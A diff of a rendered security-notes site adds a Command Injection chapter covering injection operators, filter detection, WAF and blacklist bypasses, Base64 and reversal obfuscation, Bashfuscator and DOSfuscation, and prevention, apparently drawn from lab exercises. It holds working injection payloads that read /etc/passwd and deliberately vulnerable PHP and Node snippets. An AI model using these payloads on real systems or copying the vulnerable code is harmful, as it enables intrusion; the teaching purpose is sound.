@@ -39,10 +39,10 @@
             const path_to_root = "";
             const default_light_theme = "light";
             const default_dark_theme = "navy";
-            window.path_to_searchindex_js = "searchindex-52323166.js";
+            window.path_to_searchindex_js = "searchindex-adec9fac.js";
         </script>
         <!-- Start loading toc.js asap -->
-        <script src="toc-d47aa4f8.js"></script>
+        <script src="toc-f886f5a3.js"></script>
     </head>
     <body>
     <div id="mdbook-help-container">
@@ -19318,6 +19318,10 @@ ac
 <ul>
 <li><a href="infosec/active-directory/README.html">Active Directory — directory map, cheatsheets, summary</a></li>
 </ul>
+<h3 id="command-injection"><a class="header" href="#command-injection">Command Injection</a></h3>
+<ul>
+<li><a href="infosec/command-injection/README.html">Command Injection — intro, detection, operators, filter identification, space/character/command bypasses, advanced obfuscation, evasion tools, prevention</a></li>
+</ul>
 <h3 id="file-transfers"><a class="header" href="#file-transfers">File transfers</a></h3>
 <ul>
 <li><a href="#linux-file-transfer-methods">Linux</a></li>
@@ -24169,8 +24173,421 @@ SQL&gt; xp_cmdshell whoami /priv
 <p><strong>Prerequisites (from compromised child domain):</strong> Child domain KRBTGT NT hash (via DCSync), child domain SID (<code>Get-DomainSID</code>), Enterprise Admins SID from the parent domain (<code>Get-DomainGroup -Domain &lt;PARENT&gt; -Identity "Enterprise Admins"</code>), any username (can be fake), and the child domain FQDN.</p>
 <p><strong>Execution:</strong> Mimikatz <code>kerberos::golden /user:hacker /domain:&lt;CHILD&gt; /sid:&lt;CHILD_SID&gt; /krbtgt:&lt;HASH&gt; /sids:&lt;EA_SID&gt; /ptt</code> or Rubeus <code>golden /rc4:&lt;HASH&gt; /domain:&lt;CHILD&gt; /sid:&lt;CHILD_SID&gt; /sids:&lt;EA_SID&gt; /user:hacker /ptt</code>. Then DCSync the parent domain with <code>lsadump::dcsync /user:&lt;PARENT&gt;\administrator /domain:&lt;PARENT&gt;</code>. The only defense is changing the KRBTGT password (twice) after compromise.</p>
 <div style="break-before: page; page-break-before: always;"></div>
-<h1 id="file-inclusion-1"><a class="header" href="#file-inclusion-1">File inclusion</a></h1>
+<h1 id="command-injection-1"><a class="header" href="#command-injection-1">Command Injection</a></h1>
 <h2 id="directory-map-15"><a class="header" href="#directory-map-15">Directory map</a></h2>
+<ul>
+<li><a href="#intro-to-command-injections">Intro — what command injection is, OWASP #3, OS command injection, PHP/NodeJS examples</a></li>
+<li><a href="#detecting-and-injecting-commands">Detection — injection operators, injecting commands, bypassing front-end validation, AND/OR operators, cross-injection operator reference</a></li>
+<li><a href="#identifying-filters">Identifying filters — filter vs. WAF, isolating blacklisted characters</a></li>
+<li><a href="#bypassing-space-and-operator-filters">Bypassing space and operator filters — newline as separator, tabs, <code>$IFS</code>, brace expansion</a></li>
+<li><a href="#bypassing-other-blacklisted-characters">Bypassing other blacklisted characters — env var slicing (Linux/Windows), character shifting</a></li>
+<li><a href="#bypassing-blacklisted-commands">Bypassing blacklisted commands — quote insertion, backslash/<code>$@</code> (Linux), caret (Windows)</a></li>
+<li><a href="#advanced-command-obfuscation">Advanced obfuscation — case manipulation, reversed commands, Base64 encoding (Linux/Windows)</a></li>
+<li><a href="#evasion-tools">Evasion tools — Bashfuscator (Linux), DOSfuscation (Windows)</a></li>
+<li><a href="#command-injection-prevention">Prevention — system command avoidance, input validation, sanitization, server configuration</a></li>
+</ul>
+<h2 id="summary-5"><a class="header" href="#summary-5">Summary</a></h2>
+<p><strong>Command injection</strong> vulnerabilities arise when user-controlled input flows unsanitized into a function that executes OS commands, allowing attackers to run arbitrary commands on the back-end server. Ranked <strong>#3 in OWASP’s Top 10</strong>, command injection is among the most critical web vulnerabilities — a successful exploitation can lead to full network compromise. All major web languages expose system command primitives (<code>exec</code>/<code>system</code>/<code>shell_exec</code> in PHP; <code>child_process.exec</code> / <code>child_process.spawn</code> in Node); the same injection techniques apply across all of them, and to any thick client or binary that passes unsanitized input to shell commands.</p>
+<p><strong>Detection</strong> mirrors exploitation: append a command after a known-good value using an injection operator and observe whether output changes. The core <strong>injection operators</strong> cover <code>;</code> (both commands run), <code>\n</code> / <code>%0a</code> (both, newline-separated), <code>&amp;</code> (both, second shown first), <code>|</code> (both, only second shown), <code>&amp;&amp;</code> (both only if first succeeds), <code>||</code> (second only if first fails), and sub-shell forms <code>`</code> and <code>$()</code> (Linux-only). When a front-end format check blocks a payload but fires <strong>no network request</strong>, validation is client-side only — bypass by sending a raw request through Burp Suite or ZAP, URL-encoding the payload before sending.</p>
+<p><strong>Filter and WAF identification</strong> starts by reducing the payload to one character at a time. An “Invalid input” inline response indicates an app-layer filter (e.g., a PHP <code>strpos</code> blacklist); a separate error page with IP/request details indicates a WAF. Map every blocked operator before choosing a bypass strategy.</p>
+<p><strong>Bypassing space filters</strong>: the newline character (<code>%0a</code>) is commonly unblocked and serves as an operator replacement. Spaces themselves can be replaced with a <strong>tab</strong> (<code>%09</code>), the <strong><code>${IFS}</code></strong> environment variable (Linux), or <strong>Bash brace expansion</strong> (<code>{command,-arg}</code> — no space required).</p>
+<p><strong>Bypassing character filters</strong> for slashes and semi-colons uses <strong>environment variable substring extraction</strong>: <code>${PATH:0:1}</code> yields <code>/</code>; <code>${LS_COLORS:10:1}</code> yields <code>;</code>. Use <code>printenv</code> to find variables containing any needed character and calculate the slice offset. On <strong>Windows CMD</strong>, <code>%HOMEPATH:~6,-11%</code> extracts <code>\</code>; in <strong>PowerShell</strong>, <code>$env:HOMEPATH[0]</code> does the same. <strong>Character shifting</strong> on Linux (<code>tr '!-}' '"-~'</code>) shifts ASCII values by 1, letting you produce any character by supplying the one before it in the ASCII table.</p>
+<p><strong>Bypassing command blacklists</strong> exploits the fact that Bash and PowerShell ignore certain characters mid-word. <strong>Quote insertion</strong> (<code>w'h'o'am'i</code> or <code>w"h"o"am"i</code>) works on both Linux and Windows; quotes must be even in count and of one type per word. Linux-only options: <strong>backslash</strong> (<code>w\ho\am\i</code>) and <strong><code>$@</code></strong> (<code>who$@ami</code>) — no even-count requirement. Windows CMD-only: <strong>caret</strong> (<code>who^ami</code>).</p>
+<p><strong>Advanced obfuscation</strong> goes further for WAF bypass. <strong>Case manipulation</strong> works natively on Windows (CMD/PowerShell are case-insensitive); on Linux, wrap in <code>$(tr "[A-Z]" "[a-z]"&lt;&lt;&lt;"WhOaMi")</code> and replace spaces with <code>%09</code> if spaces are filtered. <strong>Reversed commands</strong> — <code>$(rev&lt;&lt;&lt;'imaohw')</code> on Linux, <code>iex "$('imaohw'[-1..-20] -join '')"</code> on PowerShell — hide the command entirely. <strong>Base64 encoding</strong> wraps the full payload (including filtered characters) in <code>bash&lt;&lt;&lt;$(base64 -d&lt;&lt;&lt;&lt;encoded&gt;)</code> on Linux, or <code>iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('&lt;encoded&gt;')))"</code> on PowerShell; on Linux, generate Windows-compatible (UTF-16LE) Base64 via <code>iconv -f utf-8 -t utf-16le | base64</code>. Use <code>&lt;&lt;&lt;</code> instead of <code>|</code> when pipe is filtered.</p>
+<p><strong>Evasion tools</strong>: <strong>Bashfuscator</strong> (<code>-s 1 -t 1 --no-mangling --layers 1</code> for short payloads) automates multi-technique Bash obfuscation; always test locally with <code>bash -c '...'</code> before deploying. <strong>DOSfuscation</strong> (<code>Invoke-DOSfuscation</code>) is the Windows equivalent — interactive PowerShell tool that produces environment-variable-based CMD obfuscation. Both are usable on Linux via <code>pwsh</code>.</p>
+<p><strong>Prevention</strong> rests on three pillars: (1) <strong>avoid system command functions</strong> entirely when a built-in language equivalent exists (e.g., <code>fsockopen</code> instead of <code>ping</code> in PHP); (2) <strong>validate then sanitize</strong> on the back-end using allowlist regex (<code>preg_replace('/[^A-Za-z0-9.]/', '', $input)</code> in PHP, <code>.replace(/[^A-Za-z0-9.]/g, '')</code> in JS) or built-in validators (<code>filter_var</code> with <code>FILTER_VALIDATE_IP</code>, <code>is-ip</code> for Node) — never rely on front-end validation alone, and prefer allowlists over blacklists; (3) <strong>harden the server</strong> with WAF (mod_security + external), Principle of Least Privilege (<code>www-data</code>), <code>disable_functions</code>, <code>open_basedir</code>, non-ASCII URL rejection, and avoidance of legacy modules like PHP CGI. Secure coding and server hardening must be paired with ongoing penetration testing — any single flaw in a large codebase can reintroduce the vulnerability.</p>
+<div style="break-before: page; page-break-before: always;"></div>
+<h1 id="advanced-command-obfuscation"><a class="header" href="#advanced-command-obfuscation">Advanced Command Obfuscation</a></h1>
+<p>For stricter WAFs where character insertion is insufficient, these techniques transform the command’s structure entirely, making pattern-based detection much harder.</p>
+<h2 id="case-manipulation"><a class="header" href="#case-manipulation">Case manipulation</a></h2>
+<p><strong>Windows</strong> (CMD and PowerShell are case-insensitive):</p>
+<pre><code class="language-powershell">WhOaMi     # executes whoami
+</code></pre>
+<p><strong>Linux</strong> (case-sensitive — requires a normalizing wrapper):</p>
+<pre><code class="language-bash">$(tr "[A-Z]" "[a-z]"&lt;&lt;&lt;"WhOaMi")
+</code></pre>
+<p>If spaces are also filtered, replace them with tabs (<code>%09</code>):</p>
+<pre><code class="language-bash">$(tr%09"[A-Z]"%09"[a-z]"&lt;&lt;&lt;"WhOaMi")
+</code></pre>
+<p>Alternative using <code>printf</code>:</p>
+<pre><code class="language-bash">$(a="WhOaMi";printf %s "${a,,}")
+</code></pre>
+<p>Always check that obfuscation wrappers do not themselves contain filtered characters.</p>
+<h2 id="reversed-commands"><a class="header" href="#reversed-commands">Reversed commands</a></h2>
+<p>Reverse the command string, then un-reverse at execution time in a sub-shell.</p>
+<p><strong>Linux:</strong></p>
+<pre><code class="language-bash">echo 'whoami' | rev
+# imaohw
+
+$(rev&lt;&lt;&lt;'imaohw')
+</code></pre>
+<p><strong>Windows PowerShell:</strong></p>
+<pre><code class="language-powershell">"whoami"[-1..-20] -join ''
+# imaohw
+
+iex "$('imaohw'[-1..-20] -join '')"
+</code></pre>
+<p>Tip: if the payload also needs to bypass character filters, reverse those characters as well, or incorporate the filtered characters before reversing.</p>
+<h2 id="encoded-commands-base64"><a class="header" href="#encoded-commands-base64">Encoded commands (Base64)</a></h2>
+<p>Encode the full payload including any filtered characters, then decode and execute at runtime.</p>
+<p><strong>Linux:</strong></p>
+<pre><code class="language-bash">echo -n 'cat /etc/passwd | grep 33' | base64
+# Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==
+
+bash&lt;&lt;&lt;$(base64 -d&lt;&lt;&lt;Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
+</code></pre>
+<p><code>&lt;&lt;&lt;</code> avoids the pipe <code>|</code> (which may be filtered). Replace any spaces in the outer command with <code>%09</code>.</p>
+<p><strong>Windows PowerShell:</strong></p>
+<pre><code class="language-powershell">[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))
+# dwBoAG8AYQBtAGkA
+
+iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
+</code></pre>
+<p><strong>Linux → Windows-compatible Base64</strong> (UTF-16LE encoding required):</p>
+<pre><code class="language-bash">echo -n whoami | iconv -f utf-8 -t utf-16le | base64
+# dwBoAG8AYQBtAGkA
+</code></pre>
+<p>Alternative decoders: <code>openssl</code> for Base64, <code>xxd</code> for hex encoding. Alternative executors: <code>sh</code> instead of <code>bash</code> if <code>bash</code> itself is filtered.</p>
+<p>Additional techniques worth exploring: wildcards, regex, output redirection, integer expansion. See PayloadsAllTheThings for a broader catalog.</p>
+<div style="break-before: page; page-break-before: always;"></div>
+<h1 id="bypassing-other-blacklisted-characters"><a class="header" href="#bypassing-other-blacklisted-characters">Bypassing Other Blacklisted Characters</a></h1>
+<p>Slashes (<code>/</code>, <code>\</code>) and semi-colons are essential for path and command construction and are commonly blacklisted. Environment variable substring extraction produces these characters without using them literally.</p>
+<h2 id="linux--extracting-from-environment-variables"><a class="header" href="#linux--extracting-from-environment-variables">Linux — extracting from environment variables</a></h2>
+<h3 id="slash-from-path"><a class="header" href="#slash-from-path">Slash from <code>$PATH</code></a></h3>
+<p><code>$PATH</code> typically starts with <code>/usr/local/bin:...</code>. Extract the first character:</p>
+<pre><code class="language-bash">echo ${PATH:0:1}
+# Output: /
+</code></pre>
+<p>Use in a payload (omit <code>echo</code>): <code>${PATH:0:1}etc${PATH:0:1}passwd</code></p>
+<h3 id="semi-colon-from-ls_colors"><a class="header" href="#semi-colon-from-ls_colors">Semi-colon from <code>$LS_COLORS</code></a></h3>
+<pre><code class="language-bash">echo ${LS_COLORS:10:1}
+# Output: ;
+</code></pre>
+<p>Use <code>printenv</code> to inspect all environment variables. Find one that contains the needed character, then calculate the start offset and length to slice it out.</p>
+<p>Example payload combining both (semi-colon as separator, <code>$IFS</code> for spaces):</p>
+<pre><code>127.0.0.1${LS_COLORS:10:1}${IFS}whoami
+</code></pre>
+<h2 id="windows-cmd--homepath-substring"><a class="header" href="#windows-cmd--homepath-substring">Windows CMD — <code>%HOMEPATH%</code> substring</a></h2>
+<p><code>%HOMEPATH%</code> expands to something like <code>\Users\htb-student</code>. Use start position and negative end to extract the backslash:</p>
+<pre><code class="language-cmd">echo %HOMEPATH:~6,-11%
+# Output: \
+</code></pre>
+<p>Adjust the offsets to match the actual username length on the target.</p>
+<h2 id="windows-powershell--array-indexing"><a class="header" href="#windows-powershell--array-indexing">Windows PowerShell — array indexing</a></h2>
+<p>PowerShell treats strings as character arrays. Index directly into environment variables:</p>
+<pre><code class="language-powershell">$env:HOMEPATH[0]
+# Output: \
+
+$env:PROGRAMFILES[10]
+# Output: (space character)
+</code></pre>
+<p>Use <code>Get-ChildItem Env:</code> to list all variables and find characters you need.</p>
+<h2 id="character-shifting-linux"><a class="header" href="#character-shifting-linux">Character shifting (Linux)</a></h2>
+<p>Shift any ASCII character by 1 using <code>tr</code>. Find the character one position <strong>before</strong> the target in the ASCII table (<code>man ascii</code>), then use it as input:</p>
+<pre><code class="language-bash"># \ is ASCII 92, [ is ASCII 91 (one before it)
+echo $(tr '!-}' '"-~'&lt;&lt;&lt;[)
+# Output: \
+</code></pre>
+<p>Substitute <code>[</code> with whichever character precedes your target in the ASCII table.</p>
+<div style="break-before: page; page-break-before: always;"></div>
+<h1 id="bypassing-blacklisted-commands"><a class="header" href="#bypassing-blacklisted-commands">Bypassing Blacklisted Commands</a></h1>
+<p>A command blacklist blocks specific words (e.g., <code>whoami</code>, <code>cat</code>). Unlike character blacklists, these check for exact string matches — <strong>obfuscating</strong> the command string causes the filter to miss the match while the shell still executes it.</p>
+<h2 id="how-command-blacklists-work-php-example"><a class="header" href="#how-command-blacklists-work-php-example">How command blacklists work (PHP example)</a></h2>
+<pre><code class="language-php">$blacklist = ['whoami', 'cat', ...];
+foreach ($blacklist as $word) {
+    if (strpos($_POST['ip'], $word) !== false) {
+        echo "Invalid input";
+    }
+}
+</code></pre>
+<p>The filter looks for an <strong>exact</strong> substring match. Inserting characters that shells silently ignore produces a string the filter does not recognize but the shell executes normally.</p>
+<h2 id="quote-insertion-linux-and-windows"><a class="header" href="#quote-insertion-linux-and-windows">Quote insertion (Linux and Windows)</a></h2>
+<p>Bash and PowerShell ignore quotes interspersed within command words:</p>
+<pre><code class="language-bash">w'h'o'am'i       # works
+w"h"o"am"i       # works
+</code></pre>
+<p>Rules:</p>
+<ul>
+<li>Quotes must be <strong>even in count</strong> (matched pairs)</li>
+<li>Cannot <strong>mix</strong> quote types within one obfuscated word</li>
+</ul>
+<p>Example payload:</p>
+<pre><code>127.0.0.1%0aw'h'o'am'i
+</code></pre>
+<h2 id="backslash-and--linux-only"><a class="header" href="#backslash-and--linux-only">Backslash and <code>$@</code> (Linux only)</a></h2>
+<p>Bash also silently ignores <code>\</code> and <code>$@</code> inside command words. No even-count requirement — a single character is sufficient:</p>
+<pre><code class="language-bash">who$@ami
+w\ho\am\i
+</code></pre>
+<h2 id="caret--windows-cmd-only"><a class="header" href="#caret--windows-cmd-only">Caret <code>^</code> (Windows CMD only)</a></h2>
+<p>CMD ignores <code>^</code> within command words:</p>
+<pre><code class="language-cmd">who^ami
+</code></pre>
+<div style="break-before: page; page-break-before: always;"></div>
+<h1 id="bypassing-space-and-operator-filters"><a class="header" href="#bypassing-space-and-operator-filters">Bypassing Space and Operator Filters</a></h1>
+<h2 id="bypassing-blacklisted-operators"><a class="header" href="#bypassing-blacklisted-operators">Bypassing blacklisted operators</a></h2>
+<p>Most common operators (<code>;</code>, <code>&amp;&amp;</code>, <code>||</code>) are frequently blacklisted. The <strong>newline character</strong> (<code>%0a</code>) is often not blocked because it may be needed in legitimate payloads. Newline works as an injection separator on both Linux and Windows:</p>
+<pre><code>127.0.0.1%0a whoami
+</code></pre>
+<p>Once confirmed as a working separator, address any remaining filtered characters (e.g., spaces).</p>
+<h2 id="bypassing-blacklisted-spaces"><a class="header" href="#bypassing-blacklisted-spaces">Bypassing blacklisted spaces</a></h2>
+<p>Spaces are commonly blacklisted for inputs that should not contain them (like an IP address). Several alternatives exist:</p>
+<h3 id="tabs-09"><a class="header" href="#tabs-09">Tabs (<code>%09</code>)</a></h3>
+<p>Both Linux and Windows accept tabs between command arguments:</p>
+<pre><code>127.0.0.1%0a%09whoami
+</code></pre>
+<h3 id="ifs-linux"><a class="header" href="#ifs-linux"><code>$IFS</code> (Linux)</a></h3>
+<p>The <code>$IFS</code> (Internal Field Separator) environment variable defaults to space + tab. Use <code>${IFS}</code> wherever a space is needed:</p>
+<pre><code>127.0.0.1%0a${IFS}whoami
+</code></pre>
+<h3 id="brace-expansion-bash"><a class="header" href="#brace-expansion-bash">Brace expansion (Bash)</a></h3>
+<p>Bash automatically inserts spaces between brace-wrapped arguments — no space character needed:</p>
+<pre><code class="language-bash">{ls,-la}
+</code></pre>
+<p>Use in injection payloads as <code>127.0.0.1%0a{whoami}</code> or with arguments like <code>{command,-arg}</code>.</p>
+<p>See also: PayloadsAllTheThings — Writing commands without spaces for additional bypass patterns.</p>
+<div style="break-before: page; page-break-before: always;"></div>
+<h1 id="detecting-and-injecting-commands"><a class="header" href="#detecting-and-injecting-commands">Detecting and Injecting Commands</a></h1>
+<h2 id="detection-process"><a class="header" href="#detection-process">Detection process</a></h2>
+<p>Detecting basic OS command injection uses the same process as exploiting it: append a command through an injection operator and observe whether the output changes from the expected result. If it does, the injection succeeded.</p>
+<p>For advanced injections (WAFs, indirect sinks) fuzzing and code review may be needed first. This guide focuses on basic, direct injections where user input reaches a system command function without sanitization.</p>
+<h2 id="injection-operators"><a class="header" href="#injection-operators">Injection operators</a></h2>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Injection Operator</th><th>Character</th><th>URL-Encoded</th><th>Executed Command</th></tr>
+</thead>
+<tbody>
+<tr><td>Semicolon</td><td><code>;</code></td><td><code>%3b</code></td><td>Both</td></tr>
+<tr><td>New line</td><td><code>\n</code></td><td><code>%0a</code></td><td>Both</td></tr>
+<tr><td>Background</td><td><code>&amp;</code></td><td><code>%26</code></td><td>Both (second output generally shown first)</td></tr>
+<tr><td>Pipe</td><td><code>|</code></td><td><code>%7c</code></td><td>Both (only second output is shown)</td></tr>
+<tr><td>AND</td><td><code>&amp;&amp;</code></td><td><code>%26%26</code></td><td>Both (only if first succeeds)</td></tr>
+<tr><td>OR</td><td><code>||</code></td><td><code>%7c%7c</code></td><td>Second (only if first fails)</td></tr>
+<tr><td>Sub-shell</td><td><code>`</code></td><td><code>%60%60</code></td><td>Both (Linux-only)</td></tr>
+<tr><td>Sub-shell</td><td><code>$()</code></td><td><code>%24%28%29</code></td><td>Both (Linux-only)</td></tr>
+</tbody>
+</table>
+</div>
+<p>All operators work regardless of web language, framework, or OS. Exception: <code>;</code> does not work in Windows CMD but works in PowerShell.</p>
+<h2 id="injecting-a-command"><a class="header" href="#injecting-a-command">Injecting a command</a></h2>
+<p>Given a Host Checker app running <code>ping -c 1 &lt;INPUT&gt;</code>, a basic payload using <code>;</code>:</p>
+<pre><code class="language-bash">ping -c 1 127.0.0.1; whoami
+</code></pre>
+<h2 id="bypassing-front-end-validation"><a class="header" href="#bypassing-front-end-validation">Bypassing front-end validation</a></h2>
+<p>If the front-end rejects a payload (e.g., “Match the requested format”) but <strong>no network request fires</strong>, validation is client-side only. Bypass by sending a raw HTTP request directly to the back-end:</p>
+<ol>
+<li>Intercept a valid request (e.g., <code>ip=127.0.0.1</code>) with Burp Suite or ZAP</li>
+<li>Forward to Repeater (<code>CTRL+R</code>)</li>
+<li>Modify the <code>ip</code> parameter to <code>127.0.0.1; whoami</code></li>
+<li>URL-encode the payload (<code>CTRL+U</code>) and send</li>
+</ol>
+<p>A successful injection returns both commands’ output in the response.</p>
+<h2 id="and-operator-"><a class="header" href="#and-operator-">AND operator (<code>&amp;&amp;</code>)</a></h2>
+<pre><code class="language-bash">ping -c 1 127.0.0.1 &amp;&amp; whoami
+</code></pre>
+<p>Executes both commands only if the first succeeds (exit code 0). Omitting the IP and starting with <code>&amp;&amp;</code> would cause the first command to fail and only the second would be suppressed — both require the first to succeed.</p>
+<h2 id="or-operator-"><a class="header" href="#or-operator-">OR operator (<code>||</code>)</a></h2>
+<pre><code class="language-bash">ping -c 1 127.0.0.1 || whoami
+</code></pre>
+<p>Only executes the second command if the first <strong>fails</strong> (exit code 1). With a valid IP, <code>ping</code> succeeds and <code>whoami</code> is suppressed.</p>
+<p>To force execution of the injected command, <strong>intentionally break</strong> the first:</p>
+<pre><code class="language-bash">|| whoami
+</code></pre>
+<p>With no IP, <code>ping</code> fails and the injected command runs. This produces cleaner output and a simpler payload.</p>
+<h2 id="cross-injection-type-operator-reference"><a class="header" href="#cross-injection-type-operator-reference">Cross-injection-type operator reference</a></h2>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Injection Type</th><th>Common Operators</th></tr>
+</thead>
+<tbody>
+<tr><td>SQL Injection</td><td><code>'</code> <code>,</code> <code>;</code> <code>--</code> <code>/* */</code></td></tr>
+<tr><td>Command Injection</td><td><code>;</code> <code>&amp;&amp;</code></td></tr>
+<tr><td>LDAP Injection</td><td><code>*</code> <code>(</code> <code>)</code> <code>&amp;</code> <code>|</code></td></tr>
+<tr><td>XPath Injection</td><td><code>'</code> <code>or</code> <code>and</code> <code>not</code> <code>substring</code> <code>concat</code> <code>count</code></td></tr>
+<tr><td>OS Command Injection</td><td><code>;</code> <code>&amp;</code> <code>|</code></td></tr>
+<tr><td>Code Injection</td><td><code>'</code> <code>;</code> <code>--</code> <code>/* */</code> <code>$()</code> <code>${}</code> <code>#{}</code> <code>%{}</code> <code>^</code></td></tr>
+<tr><td>Directory/Path Traversal</td><td><code>../</code> <code>..\</code> <code>%00</code></td></tr>
+<tr><td>Object Injection</td><td><code>;</code> <code>&amp;</code> <code>|</code></td></tr>
+<tr><td>XQuery Injection</td><td><code>'</code> <code>;</code> <code>--</code> <code>/* */</code></td></tr>
+<tr><td>Shellcode Injection</td><td><code>\x</code> <code>\u</code> <code>%u</code> <code>%n</code></td></tr>
+<tr><td>Header Injection</td><td><code>\n</code> <code>\r\n</code> <code>\t</code> <code>%0d</code> <code>%0a</code> <code>%09</code></td></tr>
+</tbody>
+</table>
+</div>
+<p>This table is incomplete — operators vary by environment and context.</p>
+<div style="break-before: page; page-break-before: always;"></div>
+<h1 id="evasion-tools"><a class="header" href="#evasion-tools">Evasion Tools</a></h1>
+<p>Automated obfuscation tools are useful when manual techniques are insufficient against advanced WAFs.</p>
+<h2 id="bashfuscator-linux"><a class="header" href="#bashfuscator-linux">Bashfuscator (Linux)</a></h2>
+<p>Obfuscates Bash commands using multiple automated techniques.</p>
+<p><strong>Install:</strong></p>
+<pre><code class="language-bash">git clone https://github.com/Bashfuscator/Bashfuscator
+cd Bashfuscator
+pip3 install setuptools==65
+python3 setup.py install --user
+</code></pre>
+<p><strong>Basic usage:</strong></p>
+<pre><code class="language-bash">cd ./bashfuscator/bin/
+./bashfuscator -c 'cat /etc/passwd'
+</code></pre>
+<p>Random technique selection can produce payloads from a few hundred to over a million characters. Constrain output with flags:</p>
+<pre><code class="language-bash">./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1
+# Example output:
+# eval "$(W0=(w \  t e c p s a \/ d);for Ll in 4 7 2 1 8 3 2 4 8 5 7 6 6 0 9;{ printf %s "${W0[$Ll]}";};)"
+</code></pre>
+<p>Test the output locally before using in a payload:</p>
+<pre><code class="language-bash">bash -c '&lt;obfuscated payload here&gt;'
+</code></pre>
+<p>Use <code>-h</code> to see all available flags.</p>
+<h2 id="dosfuscation-windows"><a class="header" href="#dosfuscation-windows">DOSfuscation (Windows)</a></h2>
+<p>Interactive PowerShell tool for obfuscating Windows CMD commands.</p>
+<p><strong>Install and launch:</strong></p>
+<pre><code class="language-powershell">git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git
+cd Invoke-DOSfuscation
+Import-Module .\Invoke-DOSfuscation.psd1
+Invoke-DOSfuscation
+</code></pre>
+<p><strong>Example session:</strong></p>
+<pre><code>Invoke-DOSfuscation&gt; SET COMMAND type C:\Users\htb-student\Desktop\flag.txt
+Invoke-DOSfuscation&gt; encoding
+Invoke-DOSfuscation\Encoding&gt; 1
+</code></pre>
+<p>Produces environment-variable-based obfuscation:</p>
+<pre><code>typ%TEMP:~-3,-2% %CommonProgramFiles:~17,-11%:\Users\h%TMP:~-13,-12%b-stu%SystemRoot:~-4,-3%ent%TMP:~-19,-18%%ALLUSERSPROFILE:~-4,-3%esktop\flag.%TMP:~-13,-12%xt
+</code></pre>
+<p>Verify locally in CMD before using:</p>
+<pre><code class="language-cmd">typ%TEMP:~-3,-2% ...
+# test_flag
+</code></pre>
+<p>Run on Linux without a Windows VM using <code>pwsh</code> (PowerShell for Linux). Use <code>tutorial</code> within the tool for a usage walkthrough.</p>
+<div style="break-before: page; page-break-before: always;"></div>
+<h1 id="identifying-filters"><a class="header" href="#identifying-filters">Identifying Filters</a></h1>
+<p>When a payload returns “Invalid input,” a filter or blacklist is in play. Identifying <strong>which</strong> character or command triggered the block is the first step to bypassing it.</p>
+<h2 id="filter-vs-waf"><a class="header" href="#filter-vs-waf">Filter vs. WAF</a></h2>
+<ul>
+<li><strong>App-layer filter</strong> (e.g., PHP): “Invalid input” appears inline in the response body. A PHP blacklist looks like:</li>
+</ul>
+<pre><code class="language-php">$blacklist = ['&amp;', '|', ';', ...];
+foreach ($blacklist as $character) {
+    if (strpos($_POST['ip'], $character) !== false) {
+        echo "Invalid input";
+    }
+}
+</code></pre>
+<ul>
+<li><strong>WAF block</strong>: A separate error page containing details like the requester’s IP, typically indicating a network-layer device blocked the request.</li>
+</ul>
+<h2 id="isolating-the-blocked-character"><a class="header" href="#isolating-the-blocked-character">Isolating the blocked character</a></h2>
+<p>Strip the payload down to one character at a time. Start with a known-good value and add a single suspected character, then send. Repeat until the response changes to “Invalid input.”</p>
+<p>Example progression:</p>
+<ol>
+<li><code>127.0.0.1</code> → OK</li>
+<li><code>127.0.0.1;</code> → <strong>Invalid input</strong> → <code>;</code> is blacklisted</li>
+</ol>
+<p>Test each injection operator (<code>;</code>, <code>&amp;&amp;</code>, <code>||</code>, <code>&amp;</code>, <code>|</code>, <code>\n</code>) individually to map out what the blacklist covers. This determines which bypass techniques to apply next.</p>
+<div style="break-before: page; page-break-before: always;"></div>
+<h1 id="intro-to-command-injections"><a class="header" href="#intro-to-command-injections">Intro to Command Injections</a></h1>
+<h2 id="what-command-injection-is"><a class="header" href="#what-command-injection-is">What command injection is</a></h2>
+<p>A <strong>Command Injection</strong> vulnerability allows attackers to execute arbitrary OS commands directly on the back-end server. If a web application passes user-controlled input into a system command without sanitization, an attacker can inject a malicious payload to subvert the intended command and run their own. This can lead to full network compromise.</p>
+<h2 id="injection-vulnerabilities-owasp-context"><a class="header" href="#injection-vulnerabilities-owasp-context">Injection vulnerabilities (OWASP context)</a></h2>
+<p>Injection is ranked <strong>#3</strong> in OWASP’s Top 10 Web App Risks due to high impact and prevalence. Injection occurs when user-controlled input is misinterpreted as part of a query or code being executed, subverting the intended outcome to one useful to the attacker.</p>
+<p>Common injection types:</p>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Injection</th><th>Description</th></tr>
+</thead>
+<tbody>
+<tr><td>OS Command Injection</td><td>User input directly used as part of an OS command</td></tr>
+<tr><td>Code Injection</td><td>User input inside a function that evaluates code</td></tr>
+<tr><td>SQL Injection</td><td>User input directly used as part of an SQL query</td></tr>
+<tr><td>XSS / HTML Injection</td><td>Exact user input displayed on a web page</td></tr>
+</tbody>
+</table>
+</div>
+<p>Other classes include LDAP, NoSQL, HTTP Header, XPath, IMAP, ORM, and more. New web technologies introduce new injection classes.</p>
+<h2 id="os-command-injection"><a class="header" href="#os-command-injection">OS command injection</a></h2>
+<p>All major web languages provide functions to execute system commands. These may be used for installing plugins, running applications, or other server-side tasks — but when user input is passed to them unsanitized, command injection is possible.</p>
+<h3 id="php"><a class="header" href="#php">PHP</a></h3>
+<p>PHP functions that execute system commands: <code>exec</code>, <code>system</code>, <code>shell_exec</code>, <code>passthru</code>, <code>popen</code>.</p>
+<p>Vulnerable example:</p>
+<pre><code class="language-php">&lt;?php
+if (isset($_GET['filename'])) {
+    system("touch /tmp/" . $_GET['filename'] . ".pdf");
+}
+?&gt;
+</code></pre>
+<p>The <code>filename</code> GET parameter is used directly in <code>touch</code> without sanitization, allowing arbitrary command injection.</p>
+<h3 id="nodejs"><a class="header" href="#nodejs">NodeJS</a></h3>
+<p>NodeJS equivalents: <code>child_process.exec</code>, <code>child_process.spawn</code>.</p>
+<p>Vulnerable example:</p>
+<pre><code class="language-javascript">app.get("/createfile", function(req, res){
+    child_process.exec(`touch /tmp/${req.query.filename}.txt`);
+})
+</code></pre>
